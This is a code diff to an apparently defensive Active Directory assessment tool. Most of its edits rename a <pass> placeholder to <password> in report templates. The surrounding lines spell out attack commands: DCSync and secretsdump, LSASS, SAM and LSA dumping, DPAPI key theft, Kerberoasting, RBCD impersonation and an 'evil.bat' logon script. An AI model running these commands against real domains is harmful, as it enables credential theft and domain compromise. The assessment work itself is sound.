@@ -6572,7 +6579,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only enumeration of logged-on users (the impersonation targets) "
             "on the host:\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain} --loggedon-users\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain} --loggedon-users\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/impersonation"
         ),
         "remediation": (
@@ -6607,7 +6614,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# With the replication rights, replicate a specific account's secrets:\n"
             "impacket-secretsdump -k -no-pass -just-dc-user <target-account> {domain}/<user>@<dc_fqdn>\n"
-            "#   (or the whole directory)  impacket-secretsdump -just-dc {domain}/<user>:<pass>@{dc_ip}"
+            "#   (or the whole directory)  impacket-secretsdump -just-dc {domain}/<user>:<password>@{dc_ip}"
         ),
         "verify_windows": (
             "Read the domain head's ACL and list every principal granted the "
@@ -6621,7 +6628,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Enumerate who holds the replication rights over the domain object "
             "(read-only ACL analysis):\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "get object {domain_dn} --attr nTSecurityDescriptor\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
         ),
@@ -6655,7 +6662,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Full DCSync of the directory (both rights present):\n"
-            "impacket-secretsdump -just-dc {domain}/<user>:<pass>@{dc_ip}\n"
+            "impacket-secretsdump -just-dc {domain}/<user>:<password>@{dc_ip}\n"
             "#   (target only krbtgt for a Golden Ticket key)\n"
             "impacket-secretsdump -k -no-pass -just-dc-user krbtgt {domain}/<user>@<dc_fqdn>"
         ),
@@ -6671,7 +6678,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Enumerate who holds the Get-Changes-All right over the domain object "
             "(read-only ACL analysis):\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "get object {domain_dn} --attr nTSecurityDescriptor\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
         ),
@@ -6707,7 +6714,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# With all replication rights, a directory dump can also return the\n"
             "# filtered-set attributes (e.g. LAPS) alongside account hashes:\n"
-            "impacket-secretsdump -just-dc {domain}/<user>:<pass>@{dc_ip}\n"
+            "impacket-secretsdump -just-dc {domain}/<user>:<password>@{dc_ip}\n"
             "#   (LAPS password attribute is exposed to the same replication reach)"
         ),
         "verify_windows": (
@@ -6722,7 +6729,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ACL analysis of who holds the filtered-set replication right "
             "over the domain object:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "get object {domain_dn} --attr nTSecurityDescriptor\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync"
         ),
@@ -6756,7 +6763,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Read LSA secrets remotely (recovers service-account + machine-account keys):\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain} --lsa\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain} --lsa\n"
             "#   (or, Kerberos-only)  impacket-secretsdump -k -no-pass {domain}/<user>@<target-fqdn>"
         ),
         "verify_windows": (
@@ -6769,7 +6776,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "verify_linux": (
             "Confirm admin reach over the host (read-only marker, no dump):\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain}   # 'Pwn3d!' == LSA-dump-capable\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain}   # 'Pwn3d!' == LSA-dump-capable\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets"
         ),
         "remediation": (
@@ -6802,7 +6809,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Read the SAM + SYSTEM hives remotely and parse local hashes:\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain} --sam\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain} --sam\n"
             "#   (or, Kerberos-only)  impacket-secretsdump -k -no-pass {domain}/<user>@<target-fqdn>"
         ),
         "verify_windows": (
@@ -6814,7 +6821,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "verify_linux": (
             "Confirm admin reach over the host (read-only marker, no dump):\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain}   # 'Pwn3d!' == SAM-dump-capable\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain}   # 'Pwn3d!' == SAM-dump-capable\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/sam-and-lsa-secrets"
         ),
         "remediation": (
@@ -6848,7 +6855,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Dump LSASS and parse credentials remotely (SYSTEM required):\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain} -M lsassy\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain} -M lsassy\n"
             "#   (or, obtain a dump and parse offline with an LSASS parser)"
         ),
         "verify_windows": (
@@ -6862,7 +6869,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "verify_linux": (
             "Confirm admin reach over the host (read-only marker, no dump):\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain}   # 'Pwn3d!' == LSASS-dump-capable\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain}   # 'Pwn3d!' == LSASS-dump-capable\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/lsass"
         ),
         "remediation": (
@@ -6897,7 +6904,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Recover the domain DPAPI backup key (needs DA-level rights on the DC):\n"
-            "impacket-dpapi backupkeys -t {domain}/<user>:<pass>@{dc_ip} --export\n"
+            "impacket-dpapi backupkeys -t {domain}/<user>:<password>@{dc_ip} --export\n"
             "# Decrypt a user's master key, then a credential/vault blob:\n"
             "impacket-dpapi masterkey -file <masterkey_file> -pvk <backupkey.pvk>\n"
             "impacket-dpapi credential -file <credential_blob> -key <decrypted_masterkey>"
@@ -6912,7 +6919,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Confirm admin reach over the host holding the profile (read-only "
             "marker, no decryption):\n"
-            "nxc smb {target_hostname} -u <user> -p <pass> -d {domain}   # 'Pwn3d!' == DPAPI-reachable\n"
+            "nxc smb {target_hostname} -u <user> -p <password> -d {domain}   # 'Pwn3d!' == DPAPI-reachable\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/credentials/dumping/dpapi"
         ),
         "remediation": (
@@ -6945,8 +6952,8 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Read the LAPS local-admin password from the computer object (legacy LAPS):\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -d {domain} --module laps\n"
-            "#   (or) bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "nxc ldap {dc_ip} -u <user> -p <password> -d {domain} --module laps\n"
+            "#   (or) bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "get object {target} --attr ms-Mcs-AdmPwd"
         ),
         "verify_windows": (
@@ -6961,7 +6968,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only enumeration of who can read the LAPS attribute (no password "
             "retrieved):\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -d {domain} --module laps\n"
+            "nxc ldap {dc_ip} -u <user> -p <password> -d {domain} --module laps\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/dacl/read-laps-password"
         ),
         "remediation": (
@@ -7009,7 +7016,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "verify_linux": (
             "Read-only enumeration of the RODC krbtgt accounts (no ticket forged):\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -d {domain} "
+            "nxc ldap {dc_ip} -u <user> -p <password> -d {domain} "
             "--query '(name=krbtgt_*)' 'name'\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/kerberos-key-list-attack"
         ),
@@ -7043,10 +7050,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Grant yourself full control over the object you own, then abuse it:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "add genericAll {target_identity} <user>\n"
             "#   (or, using the ACE editor)  dacledit.py -action write -rights FullControl "
-            "-principal <user> -target {target} {domain}/<user>:<pass>"
+            "-principal <user> -target {target} {domain}/<user>:<password>"
         ),
         "verify_windows": (
             "Read the owner of the object's security descriptor: an unexpected "
@@ -7059,7 +7066,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "verify_linux": (
             "Read-only lookup of the object's owner via its security descriptor:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "get object {target_identity} --attr nTSecurityDescriptor\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/dacl"
         ),
@@ -7095,12 +7102,12 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Target USER. Reset the password using the extended right:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "set password {target_identity} 'Newp@ss123!'\n"
             "# Target COMPUTER. Read its LAPS local-admin password:\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -d {domain} --module laps\n"
+            "nxc ldap {dc_ip} -u <user> -p <password> -d {domain} --module laps\n"
             "# Target DOMAIN object. The set includes the replication rights (DCSync):\n"
-            "impacket-secretsdump -just-dc {domain}/<user>:<pass>@{dc_ip}"
+            "impacket-secretsdump -just-dc {domain}/<user>:<password>@{dc_ip}"
         ),
         "verify_windows": (
             "List the ACEs that grant All-Extended-Rights (ObjectType all-zeros GUID "
@@ -7113,7 +7120,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "verify_linux": (
             "Read-only ACL analysis of who holds extended rights over the object:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "get object {target_identity} --attr nTSecurityDescriptor\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/dacl"
         ),
@@ -7148,12 +7155,12 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Add an SPN to the target, then roast it, then clean up:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "set object {target_identity} servicePrincipalName -v 'fake/svc'\n"
-            "impacket-GetUserSPNs {domain}/<user>:<pass> -dc-ip {dc_ip} "
+            "impacket-GetUserSPNs {domain}/<user>:<password> -dc-ip {dc_ip} "
             "-request-user {target_identity} -outputfile roast.txt\n"
             "hashcat -m 13100 roast.txt wordlist.txt\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "set object {target_identity} servicePrincipalName -v ''"
         ),
         "verify_windows": (
@@ -7168,7 +7175,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ACL analysis of who can write the SPN of the target "
             "account:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "get object {target_identity} --attr nTSecurityDescriptor\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/dacl/targeted-kerberoasting"
         ),
@@ -7207,7 +7214,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
             "# Point the target computer's RBCD attribute at a controlled account,\n"
             "# then impersonate a privileged user to a service on the target:\n"
             "impacket-rbcd -delegate-from 'ATTACKER$' -delegate-to '{target_identity}' "
-            "-action write {domain}/<user>:<pass>\n"
+            "-action write {domain}/<user>:<password>\n"
             "impacket-getST -spn cifs/{target_hostname} -impersonate Administrator "
             "-dc-ip {dc_ip} {domain}/'ATTACKER$':<machine_pass>"
         ),
@@ -7223,7 +7230,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only ACL analysis of who can write account restrictions on the "
             "computer:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "get object {target_identity} --attr nTSecurityDescriptor\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd"
         ),
@@ -7257,7 +7264,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Set the target's logon script to a payload the workstation will run:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "set object {target_identity} scriptPath -v 'evil.bat'\n"
             "#   (place evil.bat on \\\\{domain}\\NETLOGON, then wait for {target} to log on)"
         ),
@@ -7272,7 +7279,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "verify_linux": (
             "Read-only lookup of the target's logon script and object ACL:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "get object {target_identity} --attr scriptPath\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/dacl"
         ),
@@ -7338,10 +7345,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "manual": (
             "# Membership IS the control. Confirm and, if warranted, exercise it.\n"
             "# List the privileged group's members (nested included):\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -d {domain} --groups 'Domain Admins'\n"
+            "nxc ldap {dc_ip} -u <user> -p <password> -d {domain} --groups 'Domain Admins'\n"
             "#   As a member, control of the target follows directly (e.g. reset a\n"
             "#   password, or DCSync the domain):\n"
-            "impacket-secretsdump -just-dc {domain}/<user>:<pass>@{dc_ip}"
+            "impacket-secretsdump -just-dc {domain}/<user>:<password>@{dc_ip}"
         ),
         "verify_windows": (
             "List the effective (recursive) membership of the terminal privileged "
@@ -7353,7 +7360,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only enumeration of the privileged group's membership over "
             "LDAP:\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -d {domain} --groups 'Domain Admins'\n"
+            "nxc ldap {dc_ip} -u <user> -p <password> -d {domain} --groups 'Domain Admins'\n"
             "# Reference: https://www.thehacker.recipes/ad/recon/bloodhound"
         ),
         "remediation": (
@@ -7388,10 +7395,10 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "manual": (
             "# Move the delegated SPN onto the target, then S4U to it as a privileged user:\n"
-            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <pass> "
+            "bloodyAD --host {dc_ip} -d {domain} -u <user> -p <password> "
             "set object {target_identity} servicePrincipalName -v 'cifs/{target_hostname}'\n"
             "impacket-getST -spn cifs/{target_hostname} -impersonate Administrator "
-            "-dc-ip {dc_ip} {domain}/<delegating-account>:<pass>"
+            "-dc-ip {dc_ip} {domain}/<delegating-account>:<password>"
         ),
         "verify_windows": (
             "Identify accounts configured for constrained delegation with protocol "
@@ -7406,7 +7413,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         "verify_linux": (
             "Read-only enumeration of constrained-delegation-with-protocol-"
             "transition accounts:\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -d {domain} --trusted-for-delegation\n"
+            "nxc ldap {dc_ip} -u <user> -p <password> -d {domain} --trusted-for-delegation\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/kerberos/delegations"
         ),
         "remediation": (
@@ -7457,7 +7464,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "verify_linux": (
             "Read-only enumeration of the forest trusts and their attributes:\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -d {domain} --query "
+            "nxc ldap {dc_ip} -u <user> -p <password> -d {domain} --query "
             "'(objectClass=trustedDomain)' 'trustAttributes trustDirection'\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/trusts"
         ),
@@ -7510,7 +7517,7 @@ _NARRATIVE_OVERLAYS: dict[str, dict[str, Any]] = {
         ),
         "verify_linux": (
             "Read-only enumeration of the forest's domains and trusts:\n"
-            "nxc ldap {dc_ip} -u <user> -p <pass> -d {domain} --query "
+            "nxc ldap {dc_ip} -u <user> -p <password> -d {domain} --query "
             "'(objectClass=trustedDomain)' 'name trustAttributes'\n"
             "# Reference: https://www.thehacker.recipes/ad/movement/trusts"
         ),
@@ -8657,7 +8664,8 @@ _VERIFICATION_OVERLAYS: dict[str, dict[str, Any]] = {
                 "hashcat -m 13100 kerberoast.hashes <wordlist>",
             ),
             _xw(
-                "The same request from a domain-joined Windows host.",
+                "From a domain-joined Windows host, request the service ticket for "
+                "{target} and print it as a crackable hash.",
                 "Rubeus.exe kerberoast /user:{target_identity} /nowrap",
             ),
         ),
@@ -8698,7 +8706,8 @@ _VERIFICATION_OVERLAYS: dict[str, dict[str, Any]] = {
                 "hashcat -m 18200 asrep.hashes <wordlist>",
             ),
             _xw(
-                "The same request from a domain-joined Windows host.",
+                "From a domain-joined Windows host, collect the authentication "
+                "response for {target} as a crackable hash.",
                 "Rubeus.exe asreproast /user:{target_identity} /format:hashcat /nowrap",
             ),
         ),
@@ -10696,7 +10705,7 @@ def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
     # context, or a synthetic per-relation edge bake), the fallback keeps the
     # literal angle-bracket token so the command stays valid and copyable.
     #
-    # SECURITY: <user> and <pass> are deliberately NOT resolved here. <pass> is
+    # SECURITY: <user> and <password> are deliberately NOT resolved here. <password> is
     # the client's credential and must NEVER be written into a command that lands
     # in a PDF or the web CTEM. <user> is ambiguous (attacker vs auditor vs the
     # step's own principal) so it stays a literal placeholder the operator fills
@@ -11049,6 +11058,15 @@ def _extract_step_placeholders(step: dict[str, Any]) -> dict[str, str]:
         # ARGUMENTS (never narrative/remediation prose, which keeps the readable
         # display label).
         "source_identity": _identity_placeholder("source"),
+        # The domain GROUP that holds the right, as a command argument: the
+        # source itself when the source is a group (the scan knows it), an
+        # honest fill-in otherwise. A command never shows a placeholder for a
+        # group the directory already named.
+        "source_group": (
+            (_real_samaccountname("source") or source)
+            if source_object_class == "group" and (_real_samaccountname("source") or source)
+            else "<workstation-admins-group>"
+        ),
         "target_identity": _identity_placeholder("target"),
         "source_dn": _dn_placeholder("source"),
         "target_dn": _dn_placeholder("target"),
@@ -11225,7 +11243,7 @@ def render_step_manual_command(step: dict[str, Any]) -> str:
     the environment), never the humanized realm-qualified display label — a
     ``-u ACCOUNT OPERATORS@HTB.LOCAL@<domain>`` command is not runnable. The
     ``{source}`` / ``{target}`` display labels appear only in the intro prose,
-    which this joined form omits. Secrets the learner supplies (``<pass>``) and values with no
+    which this joined form omits. Secrets the learner supplies (``<password>``) and values with no
     scan-time source (``<ca_name>``, ``<attacker_ip>``, ``<user>``) stay as
     ``<…>`` angle-bracket fill-in tokens (not ``{}`` placeholders, so
     ``str.format`` leaves them untouched); an env placeholder with no value in
@@ -11375,9 +11393,9 @@ STEP_SPECIFIC_REMEDIATION_ORIGIN_PREFIX: str = "structural_hierarchy:"
 def remediation_origin_is_step_specific(origin: str) -> bool:
     """Whether a remediation bullet's origin only makes sense on its own step.
 
-    Consumers that summarise a technique across its occurrences (the report's
-    "techniques behind these attack paths" section) must drop these; consumers
-    rendering one step keep them.
+    A consumer that summarises a technique across its occurrences must drop
+    these; a consumer rendering one step keeps them. (The SAR no longer has
+    such a summary: it explains a technique at its first step.)
     """
     return str(origin or "").startswith(STEP_SPECIFIC_REMEDIATION_ORIGIN_PREFIX)
 
